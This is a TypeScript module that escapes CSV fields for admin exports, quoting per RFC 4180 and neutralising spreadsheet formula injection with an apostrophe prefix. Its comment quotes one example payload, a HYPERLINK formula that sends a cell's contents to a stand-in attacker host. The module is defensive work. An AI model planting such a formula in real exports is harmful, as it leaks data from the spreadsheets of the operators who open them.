/**
 * CSV field escaping for admin exports.
 *
 * Two separate concerns. RFC 4180 says a field containing a quote, comma, CR or
 * LF must be quoted with its quotes doubled. Spreadsheets add a second one:
 * a field starting with =, +, -, @, tab or CR is evaluated as a formula on
 * open. Customer names come straight from a public checkout form, so a name
 * like `=HYPERLINK("http://evil.example?d="&A1,"Invoice")` would execute in the
 * operator's spreadsheet. Prefixing with an apostrophe neutralises it while
 * staying readable.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /["\r\n,]/;

export function csvField(value: string | number | boolean | null | undefined): string {
  const text = value == null ? "" : String(value);
  const safe = FORMULA_LEAD.test(text) ? `'${text}` : text;
  return NEEDS_QUOTING.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

export function csvRow(values: (string | number | boolean | null | undefined)[]): string {
  return values.map(csvField).join(",");
}
